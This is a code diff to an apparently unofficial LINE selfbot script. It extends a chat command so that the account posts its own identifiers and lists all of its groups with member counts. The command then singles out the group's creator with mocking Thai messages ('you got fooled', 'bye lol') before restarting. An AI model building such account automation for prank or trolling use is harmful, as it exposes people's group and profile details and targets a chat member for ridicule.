@@ -1136,11 +1136,19 @@ def lineBot(op):
             if msg.text in ["!help","!Help"]:
                     helpOhm = helpohm()
                     ZenTuRy.sendMessage(to, str(helpOhm))
-            if msg.text in ["!ohm","!Ohm"]:
+            if msg.text in ["จัดมา","จัดมา"]:
+                    ZenTuRy.sendMessage(to, "CONFIRM....")
+                    ZenTuRy.sendMessage(to, "ACTIVATING THE BOT")
+                    ZenTuRy.sendMessage(to, "เริ่มการปั่นได้")
                     ZenTuRy.sendMessage(to, "ME")
                     ZenTuRy.sendContact(to, ZenTuRyMID)
+                    ZenTuRy.sendMessage(to, "NAME")
+                    me = ZenTuRy.getContact(ZenTuRyMID)
+                    ZenTuRy.sendMessage(msg.to,">" + me.displayName)
                     ZenTuRy.sendMessage(to, "STATUS")
                     me = ZenTuRy.getContact(ZenTuRyMID)
+                    ZenTuRy.sendMessage(to, "MID")
+                    ZenTuRy.sendMessage(msg.to,">" +  ZenTuRyMID)
                     ZenTuRy.sendMessage(msg.to,">" + me.statusMessage)
                     ZenTuRy.sendMessage(to, "PICTURE PROFILE")
                     me = ZenTuRy.getContact(ZenTuRyMID)
@@ -1149,6 +1157,26 @@ def lineBot(op):
                     me = ZenTuRy.getContact(ZenTuRyMID)
                     cover = ZenTuRy.getProfileCoverURL(ZenTuRyMID)    
                     ZenTuRy.sendImageWithURL(msg.to, cover)
+                    ZenTuRy.sendMessage(to, "ALL MY GROUP")
+                    groups = ZenTuRy.groups
+                    ret_ = "╔══[ รายชื่อกลุ่มทั้งหมด Groups List ]"
+                    no = 0 + 1
+                    for gid in groups:
+                        group = ZenTuRy.getGroup(gid)
+                        ret_ += "\n╠ {}. {} | {}".format(str(no), str(group.name), str(len(group.members)))
+                        no += 1
+                    ret_ += "\n╚══[ มีกลุ่มทั้งหมด {} กลุ่ม ]".format(str(len(groups)))
+                    ZenTuRy.sendMessage(to, str(ret_))
+                    ZenTuRy.sendMessage(to, "GROUP CREATOR")
+                    group = ZenTuRy.getGroup(to)
+                    GS = group.creator.mid
+                    ZenTuRy.sendContact(to, GS)
+                    ZenTuRy.sendMessage(to, "นี่นะหรอคนสร้างกลุ่ม 555+")
+                    ZenTuRy.sendMessage(to, "โดนหลอกดาวแล้วววว")
+                    ZenTuRy.sendMessage(to, "ลาก่อน 555+")
+                    ZenTuRy.sendMessage(to, "กำลังให้บอท LOGOUT....")
+                    ZenTuRy.sendMessage(to, "SEE YOU NEXT TIME...")
+                    restartBot()
 #==============================================================================#
         if op.type == 26:
             print ("[ 26 ] RECEIVE MESSAGE")
